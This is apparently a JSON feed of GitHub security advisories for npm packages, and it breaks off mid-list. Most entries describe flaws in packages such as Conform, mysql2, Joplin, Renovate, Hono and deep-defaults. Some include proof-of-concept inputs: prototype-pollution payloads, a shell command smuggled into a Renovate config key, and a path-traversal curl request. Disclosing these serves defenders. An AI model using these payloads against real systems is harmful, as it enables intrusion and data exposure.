{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Conform allows the parsing of nested objects in the form of <code>object.property</code>. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to <code>parseWith...</code> functions.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-javascript\">const { parseWithZod } = require('@conform-to/zod');\nconst { z } = require(\"zod\");\n\nconst param = new URLSearchParams(\"__proto__.pollution=polluted\");\nconst schema = z.object({ \"a\": z.string() });\n\nparseWithZod(param, { schema });\nconsole.log(\"pollution:\", ({}).pollution); // should print \"polluted\"\n</code></pre>\n<h3 id=\"details\">Details</h3>\n<p>The invocation of the <code>parseWithZod</code> function in the above PoC triggers the <code>setValue</code> function through <code>getSubmissionContext</code> and <code>parse</code>, executing the following process, resulting in prototype pollution:</p>\n<pre><code class=\"language-javascript\">let pointer = value;\n\npointer.__proto__ = pointer.__proto__;\npointer = pointer.__proto__;\n\npointer.polluted = \"polluted\";\n</code></pre>\n<p>This is caused by the lack of object existence checking on <a href=\"https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117\">line 117 in formdata.ts</a>, where the code only checks for the presence of <code>pointer[key]</code> without proper validation.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf\">https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf</a></li>\n<li><a href=\"https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de\">https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32866\">https://nvd.nist.gov/vuln/detail/CVE-2024-32866</a></li>\n<li><a href=\"https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117\">https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-624g-8qjg-8qxf\">https://github.com/advisories/GHSA-624g-8qjg-8qxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-624g-8qjg-8qxf",
            "title": "[@conform-to/yup] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function",
            "date_modified": "2024-04-24T14:26:34.000Z",
            "date_published": "2024-04-23T21:15:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-624g-8qjg-8qxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Conform allows the parsing of nested objects in the form of <code>object.property</code>. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to <code>parseWith...</code> functions.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-javascript\">const { parseWithZod } = require('@conform-to/zod');\nconst { z } = require(\"zod\");\n\nconst param = new URLSearchParams(\"__proto__.pollution=polluted\");\nconst schema = z.object({ \"a\": z.string() });\n\nparseWithZod(param, { schema });\nconsole.log(\"pollution:\", ({}).pollution); // should print \"polluted\"\n</code></pre>\n<h3 id=\"details\">Details</h3>\n<p>The invocation of the <code>parseWithZod</code> function in the above PoC triggers the <code>setValue</code> function through <code>getSubmissionContext</code> and <code>parse</code>, executing the following process, resulting in prototype pollution:</p>\n<pre><code class=\"language-javascript\">let pointer = value;\n\npointer.__proto__ = pointer.__proto__;\npointer = pointer.__proto__;\n\npointer.polluted = \"polluted\";\n</code></pre>\n<p>This is caused by the lack of object existence checking on <a href=\"https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117\">line 117 in formdata.ts</a>, where the code only checks for the presence of <code>pointer[key]</code> without proper validation.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf\">https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf</a></li>\n<li><a href=\"https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de\">https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32866\">https://nvd.nist.gov/vuln/detail/CVE-2024-32866</a></li>\n<li><a href=\"https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117\">https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-624g-8qjg-8qxf\">https://github.com/advisories/GHSA-624g-8qjg-8qxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-624g-8qjg-8qxf",
            "title": "[@conform-to/zod] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function",
            "date_modified": "2024-04-24T14:26:34.000Z",
            "date_published": "2024-04-23T21:15:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-624g-8qjg-8qxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Conform allows the parsing of nested objects in the form of <code>object.property</code>. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to <code>parseWith...</code> functions.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-javascript\">const { parseWithZod } = require('@conform-to/zod');\nconst { z } = require(\"zod\");\n\nconst param = new URLSearchParams(\"__proto__.pollution=polluted\");\nconst schema = z.object({ \"a\": z.string() });\n\nparseWithZod(param, { schema });\nconsole.log(\"pollution:\", ({}).pollution); // should print \"polluted\"\n</code></pre>\n<h3 id=\"details\">Details</h3>\n<p>The invocation of the <code>parseWithZod</code> function in the above PoC triggers the <code>setValue</code> function through <code>getSubmissionContext</code> and <code>parse</code>, executing the following process, resulting in prototype pollution:</p>\n<pre><code class=\"language-javascript\">let pointer = value;\n\npointer.__proto__ = pointer.__proto__;\npointer = pointer.__proto__;\n\npointer.polluted = \"polluted\";\n</code></pre>\n<p>This is caused by the lack of object existence checking on <a href=\"https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117\">line 117 in formdata.ts</a>, where the code only checks for the presence of <code>pointer[key]</code> without proper validation.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf\">https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf</a></li>\n<li><a href=\"https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de\">https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32866\">https://nvd.nist.gov/vuln/detail/CVE-2024-32866</a></li>\n<li><a href=\"https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117\">https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-624g-8qjg-8qxf\">https://github.com/advisories/GHSA-624g-8qjg-8qxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-624g-8qjg-8qxf",
            "title": "[@conform-to/dom] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function",
            "date_modified": "2024-04-24T14:26:34.000Z",
            "date_published": "2024-04-23T21:15:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-624g-8qjg-8qxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package mysql2 before 3.9.7 are vulnerable to Arbitrary Code Injection due to improper sanitization of the timezone parameter in the readCodeFor function by calling a native MySQL Server date/time function.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21511\">https://nvd.nist.gov/vuln/detail/CVE-2024-21511</a></li>\n<li><a href=\"https://github.com/sidorares/node-mysql2/pull/2608\">https://github.com/sidorares/node-mysql2/pull/2608</a></li>\n<li><a href=\"https://github.com/sidorares/node-mysql2/commit/7d4b098c7e29d5a6cb9eac2633bfcc2f0f1db713\">https://github.com/sidorares/node-mysql2/commit/7d4b098c7e29d5a6cb9eac2633bfcc2f0f1db713</a></li>\n<li><a href=\"https://github.com/sidorares/node-mysql2/releases/tag/v3.9.7\">https://github.com/sidorares/node-mysql2/releases/tag/v3.9.7</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-MYSQL2-6670046\">https://security.snyk.io/vuln/SNYK-JS-MYSQL2-6670046</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4rch-2fh8-94vw\">https://github.com/advisories/GHSA-4rch-2fh8-94vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4rch-2fh8-94vw",
            "title": "[mysql2] MySQL2 for Node Arbitrary Code Injection",
            "date_modified": "2024-04-23T20:50:58.000Z",
            "date_published": "2024-04-23T06:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4rch-2fh8-94vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Joplin version 2.8.8 allows an external attacker to execute arbitrary commands remotely on any client that opens a link in a malicious markdown file, via Joplin. This is possible because the application does not properly validate the schema/protocol of existing links in the markdown file before passing them to the <code>shell.openExternal</code> function.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-40277\">https://nvd.nist.gov/vuln/detail/CVE-2022-40277</a></li>\n<li><a href=\"https://fluidattacks.com/advisories/skrillex\">https://fluidattacks.com/advisories/skrillex</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mjr5-v9c9-mm7g\">https://github.com/advisories/GHSA-mjr5-v9c9-mm7g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mjr5-v9c9-mm7g",
            "title": "[joplin] Joplin Remote Code Execution",
            "date_modified": "2024-04-23T17:43:46.000Z",
            "date_published": "2022-10-01T00:00:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mjr5-v9c9-mm7g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross Site Scripting (XSS) vulnerability in Joplin Desktop App before 1.8.5 allows attackers to execute aribrary code due to improper sanitizing of html.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-33295\">https://nvd.nist.gov/vuln/detail/CVE-2021-33295</a></li>\n<li><a href=\"https://github.com/laurent22/joplin/commit/9c20d5947d1fa4678a8b640792ff3d31224f0adf\">https://github.com/laurent22/joplin/commit/9c20d5947d1fa4678a8b640792ff3d31224f0adf</a></li>\n<li><a href=\"https://github.com/laurent22/joplin/releases/tag/v1.8.5\">https://github.com/laurent22/joplin/releases/tag/v1.8.5</a></li>\n<li><a href=\"https://the-it-wonders.blogspot.com/2021/05/joplin-app-desktop-version-vulnerable.html\">https://the-it-wonders.blogspot.com/2021/05/joplin-app-desktop-version-vulnerable.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-phj8-2p6x-hq5r\">https://github.com/advisories/GHSA-phj8-2p6x-hq5r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-phj8-2p6x-hq5r",
            "title": "[joplin] Joplin Cross Site Scripting Vulnerability via NOSCRIPT tags",
            "date_modified": "2024-04-23T17:43:35.000Z",
            "date_published": "2022-06-17T00:01:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-phj8-2p6x-hq5r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Joplin version prior to 1.0.90 contains a Cross-site Scripting (XSS) evolving into code execution due to enabled nodeIntegration for that particular BrowserWindow instance where XSS was identified from vulnerability in Note content field - information on the fix can be found here <a href=\"https://github.com/laurent22/joplin/commit/494e235e18659574f836f84fcf9f4d4fcdcfcf89\">https://github.com/laurent22/joplin/commit/494e235e18659574f836f84fcf9f4d4fcdcfcf89</a> that can result in executing unauthorized code within the rights in which the application is running. This attack appear to be exploitable via Victim synchronizing notes from the cloud services or other note-keeping services which contain malicious code. This vulnerability appears to have been fixed in 1.0.90 and later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-1000534\">https://nvd.nist.gov/vuln/detail/CVE-2018-1000534</a></li>\n<li><a href=\"https://github.com/laurent22/joplin/issues/500\">https://github.com/laurent22/joplin/issues/500</a></li>\n<li><a href=\"https://github.com/laurent22/joplin/commit/494e235e18659574f836f84fcf9f4d4fcdcfcf89\">https://github.com/laurent22/joplin/commit/494e235e18659574f836f84fcf9f4d4fcdcfcf89</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m6mf-hmrh-ph4j\">https://github.com/advisories/GHSA-m6mf-hmrh-ph4j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m6mf-hmrh-ph4j",
            "title": "[joplin] Joplin Vulnerable to Cross-site Scripting in Note Content ",
            "date_modified": "2024-04-23T17:42:55.000Z",
            "date_published": "2022-05-14T03:06:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m6mf-hmrh-ph4j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Joplin prior to version 2.7.1 allows remote attackers to execute system commands through malicious code in user search results.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23340\">https://nvd.nist.gov/vuln/detail/CVE-2022-23340</a></li>\n<li><a href=\"https://github.com/laurent22/joplin/issues/6004\">https://github.com/laurent22/joplin/issues/6004</a></li>\n<li><a href=\"https://github.com/laurent22/joplin/commit/810018b41f4d9f0c2fd9af4b8fd332fa4a0210f0\">https://github.com/laurent22/joplin/commit/810018b41f4d9f0c2fd9af4b8fd332fa4a0210f0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8478-53pv-jxvm\">https://github.com/advisories/GHSA-8478-53pv-jxvm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8478-53pv-jxvm",
            "title": "[joplin] Joplin Vulnerable to Code Injection",
            "date_modified": "2024-04-23T17:42:20.000Z",
            "date_published": "2022-02-09T00:00:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8478-53pv-jxvm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Joplin before 2.0.9 allows Cross-site Scripting via button and form in the note body.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37916\">https://nvd.nist.gov/vuln/detail/CVE-2021-37916</a></li>\n<li><a href=\"https://github.com/laurent22/joplin/commit/feaecf765368f2c273bea3a9fa641ff0da7e6b26\">https://github.com/laurent22/joplin/commit/feaecf765368f2c273bea3a9fa641ff0da7e6b26</a></li>\n<li><a href=\"https://github.com/laurent22/joplin/releases/tag/v2.0.9\">https://github.com/laurent22/joplin/releases/tag/v2.0.9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mrmf-755g-w2vw\">https://github.com/advisories/GHSA-mrmf-755g-w2vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mrmf-755g-w2vw",
            "title": "[joplin] Joplin vulnerable to Cross-site Scripting in notes",
            "date_modified": "2024-04-23T17:41:45.000Z",
            "date_published": "2022-05-24T19:09:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mrmf-755g-w2vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Attackers with commit access to the default branch of a repo using Renovate could manipulate helmv3 registryAliases to execute arbitrary commands.</p>\n<h3 id=\"details\">Details</h3>\n<p>Since <a href=\"https://github.com/renovatebot/renovate/pull/26848\">#26848</a>, <code>registryAliases</code> has become mergeable. This means that the helmv3 manager started honoring its value and uses a <code>helm repo add &lt;key&gt; &lt;parameters&gt;</code> command for each defined alias. See source code: <a href=\"https://github.com/renovatebot/renovate/blob/23f3df6216375cb5bcfe027b0faee304f877f891/lib/modules/manager/helmv3/artifacts.ts#L80\">https://github.com/renovatebot/renovate/blob/23f3df6216375cb5bcfe027b0faee304f877f891/lib/modules/manager/helmv3/artifacts.ts#L80</a>\nThe key was not quoted, leading to the ability to use variable references (<code>$FOO</code>) in it and have them printed by Renovate on the pull request, or even running any shell commands.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Inside a repository where Renovate runs, add a Helm chart with an outdated dependency, for example:</p>\n<p>test-chart/Chart.yaml:</p>\n<pre><code>apiVersion: v2\nname: redis\nversion: 1.0.0\ndependencies:\n  - name: redis\n    version: 18.13.10\n    repository: oci://registry-1.docker.io/bitnamicharts\n</code></pre>\n<p>test-chart/Chart.lock:</p>\n<pre><code>dependencies:\n- name: redis\n  repository: oci://registry-1.docker.io/bitnamicharts\n  version: 18.13.10\ndigest: sha256:11267bd32ea6c5c120ddebbb9f21e4a3c7700a961aa1a27ddb55df1fb8059a38\ngenerated: \"2024-02-16T13:31:20.807026334Z\"\n</code></pre>\n<p>Then add the following <code>renovate.json</code>:</p>\n<pre><code class=\"language-json\">{\n  \"$schema\": \"https://docs.renovatebot.com/renovate-schema.json\",\n  \"extends\": [\n    \"config:base\"\n  ],\n  \"registryAliases\": {\n    \"foo/bar || sh -c 'ls /; exit 1' &gt;&amp;2\": \"registry.example.com/proxy\"\n  }\n}\n</code></pre>\n<p>Once Renovate runs on the repository, it will create a pull request, and add a comment titled \"Artifact update problem\" containing the following text:</p>\n<pre><code>File name: test-chart/Chart.lock\n\nCommand failed: helm repo add foo/bar || sh -c 'ls /; exit 1' &gt;&amp;2 registry.example.com/proxy --force-update\nError: \"helm repo add\" requires 2 arguments\n\nUsage:  helm repo add [NAME] [URL] [flags]\nbin\nboot\ndev\netc\ngo\nhome\nlib\nlib32\nlib64\nlibx32\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n</code></pre>\n<p>This shows that the <code>ls</code> command executed successfully, and we can even see its output.</p>\n<p>Note that redirecting any output you want to see to stderr (<code>&gt;&amp;2</code>) and making sure the final command fails (<code>exit 1</code>) is required in this case, as Renovate only adds a comment if the command fails, and it contains only stderr (not stdout) output.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>All Renovate versions from 37.158.0 up until 37.199.0 were affected. This vulnerability allows full access to Renovate's execution environment. The level of severity depends on how Renovate is deployed (Docker, Kubernetes, CI pipeline, ...) and whether Renovate is being offered to untrusted users/repositories.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/renovatebot/renovate/security/advisories/GHSA-rqgv-292v-5qgr\">https://github.com/renovatebot/renovate/security/advisories/GHSA-rqgv-292v-5qgr</a></li>\n<li><a href=\"https://github.com/renovatebot/renovate/commit/1e941fd885c799f2d38f4084a6f4cb9438813c8f\">https://github.com/renovatebot/renovate/commit/1e941fd885c799f2d38f4084a6f4cb9438813c8f</a></li>\n<li><a href=\"https://github.com/renovatebot/renovate/blob/23f3df6216375cb5bcfe027b0faee304f877f891/lib/modules/manager/helmv3/artifacts.ts#L80\">https://github.com/renovatebot/renovate/blob/23f3df6216375cb5bcfe027b0faee304f877f891/lib/modules/manager/helmv3/artifacts.ts#L80</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rqgv-292v-5qgr\">https://github.com/advisories/GHSA-rqgv-292v-5qgr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rqgv-292v-5qgr",
            "title": "[renovate] Renovate vulnerable to arbitrary command injection via helmv3 manager and registryAliases",
            "date_modified": "2024-04-23T16:21:10.000Z",
            "date_published": "2024-04-23T16:21:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rqgv-292v-5qgr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When using serveStatic with deno, it is possible to directory traverse where main.ts is located.</p>\n<p>My environment is configured as per this tutorial\n<a href=\"https://hono.dev/getting-started/deno\">https://hono.dev/getting-started/deno</a></p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">$ tree\n.\n├── deno.json\n├── deno.lock\n├── main.ts\n├── README.md\n└── static\n    └── a.txt\n</code></pre>\n<p>source</p>\n<pre><code class=\"language-jsx\">import { Hono } from 'https://deno.land/x/hono@v4.2.6/mod.ts'\nimport { serveStatic } from 'https://deno.land/x/hono@v4.2.6/middleware.ts'\n\nconst app = new Hono()\napp.use('/static/*', serveStatic({ root: './' }))\n\nDeno.serve(app.fetch)\n</code></pre>\n<p>request</p>\n<pre><code class=\"language-bash\">curl localhost:8000/static/%2e%2e/main.ts\n</code></pre>\n<p>response is content of main.ts</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Unexpected files are retrieved.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/honojs/hono/security/advisories/GHSA-3mpf-rcc7-5347\">https://github.com/honojs/hono/security/advisories/GHSA-3mpf-rcc7-5347</a></li>\n<li><a href=\"https://github.com/honojs/hono/commit/92e65fbb6e5e7372650e7690dbd84938432d9e65\">https://github.com/honojs/hono/commit/92e65fbb6e5e7372650e7690dbd84938432d9e65</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32869\">https://nvd.nist.gov/vuln/detail/CVE-2024-32869</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3mpf-rcc7-5347\">https://github.com/advisories/GHSA-3mpf-rcc7-5347</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3mpf-rcc7-5347",
            "title": "[hono] Hono vulnerable to Restricted Directory Traversal in serveStatic with deno",
            "date_modified": "2024-04-24T14:26:48.000Z",
            "date_published": "2024-04-23T16:20:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3mpf-rcc7-5347"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Server-Side Template Injection (SSTI) was discovered in Form.io 2.0.0. This leads to Remote Code Execution during deletion of the default Email template URL. NOTE: the email templating service was removed after 2020.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-28246\">https://nvd.nist.gov/vuln/detail/CVE-2020-28246</a></li>\n<li><a href=\"https://github.com/formio/enterprise-release/blob/master/API-Server-Change-Log.md\">https://github.com/formio/enterprise-release/blob/master/API-Server-Change-Log.md</a></li>\n<li><a href=\"https://github.com/formio/formio\">https://github.com/formio/formio</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-52vj-mr2j-f8jh\">https://github.com/advisories/GHSA-52vj-mr2j-f8jh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-52vj-mr2j-f8jh",
            "title": "[formio] Server-Side Template Injection in formio",
            "date_modified": "2024-04-23T14:51:25.000Z",
            "date_published": "2022-06-03T00:00:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-52vj-mr2j-f8jh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>GitBook through 2.6.9 allows Cross-site Scripting via javascript inclusion in a local .md file.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-19596\">https://nvd.nist.gov/vuln/detail/CVE-2019-19596</a></li>\n<li><a href=\"https://github.com/ianxtianxt/gitbook-xss\">https://github.com/ianxtianxt/gitbook-xss</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hwgp-c653-6684\">https://github.com/advisories/GHSA-hwgp-c653-6684</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hwgp-c653-6684",
            "title": "[gitbook] GitBook allows Cross-site Scripting via a local .md file.",
            "date_modified": "2024-04-22T23:23:18.000Z",
            "date_published": "2022-05-24T17:02:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hwgp-c653-6684"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"overview\">Overview</h3>\n<p>Prototype pollution vulnerability in 'deep-defaults' versions 1.0.0 through 1.0.5 allows attacker to cause a denial of service and may lead to remote code execution.</p>\n<h3 id=\"details\">Details</h3>\n<p>The NPM module <code>deep-defaults</code> can be abused by Prototype Pollution vulnerability since the function <code>_deepDefaults()</code> does not check for the type of object before assigning value to the property. Due to this flaw an attacker could create a non-existent property or able to manipulate the property which leads to Denial of Service or potentially Remote code execution.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The <code>_deepDefaults ()</code> function accepts <code>dest</code>, <code>src</code> as arguments. Due to the absence of validation on the values passed into the <code>src</code> argument, an attacker can supply a malicious value by adjusting the value to include the <code>__proto__</code> property. Since there is no validation before assigning the property to check whether the assigned argument is the Object's own property or not, the property <code>polluted</code> will be directly be assigned to the new object thereby polluting the Object prototype. Later in the code, if there is a check to validate <code>polluted</code> the valued would be substituted as \"Yes! Its Polluted\" as it had been polluted.</p>\n<pre><code class=\"language-js\">var deepDefaults = require(\"deep-defaults\")\nvar malicious_payload = '{\"__proto__\":{\"polluted\":\"Yes! Its Polluted\"}}';\nvar obj ={};\nconsole.log(\"Before : \" + {}.polluted);\ndeepDefaults(obj, JSON.parse(malicious_payload));\nconsole.log(\"After : \" + {}.polluted);\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-25944\">https://nvd.nist.gov/vuln/detail/CVE-2021-25944</a></li>\n<li><a href=\"https://github.com/d5/deep-defaults/blob/321d0e2231aa807d54e7f95d75c22048a806923f/lib/index.js#L16\">https://github.com/d5/deep-defaults/blob/321d0e2231aa807d54e7f95d75c22048a806923f/lib/index.js#L16</a></li>\n<li><a href=\"https://web.archive.org/web/20210525211925/https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944\">https://web.archive.org/web/20210525211925/https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h6xg-rg33-9mf4\">https://github.com/advisories/GHSA-h6xg-rg33-9mf4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h6xg-rg33-9mf4",
            "title": "[deep-defaults] deep-defaults vulnerable to prototype pollution",
            "date_modified": "2024-04-22T23:22:36.000Z",
            "date_published": "2022-05-24T19:03:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h6xg-rg33-9mf4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Obsidian before 0.12.12 does not require user confirmation for non-http/https URLs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-38148\">https://nvd.nist.gov/vuln/detail/CVE-2021-38148</a></li>\n<li><a href=\"https://web.archive.org/web/20210807011714/https://forum.obsidian.md/t/obsidian-release-v0-12-12/21564\">https://web.archive.org/web/20210807011714/https://forum.obsidian.md/t/obsidian-release-v0-12-12/21564</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-45mx-g85m-wwm3\">https://github.com/advisories/GHSA-45mx-g85m-wwm3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-45mx-g85m-wwm3",
            "title": "[obsidian] Obsidian does not require user confirmation for non-http/https URLs.",
            "date_modified": "2024-04-22T23:22:17.000Z",
            "date_published": "2022-05-24T19:10:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-45mx-g85m-wwm3"
            },
            "tags": [
                "severity"
            ]
        },
        {
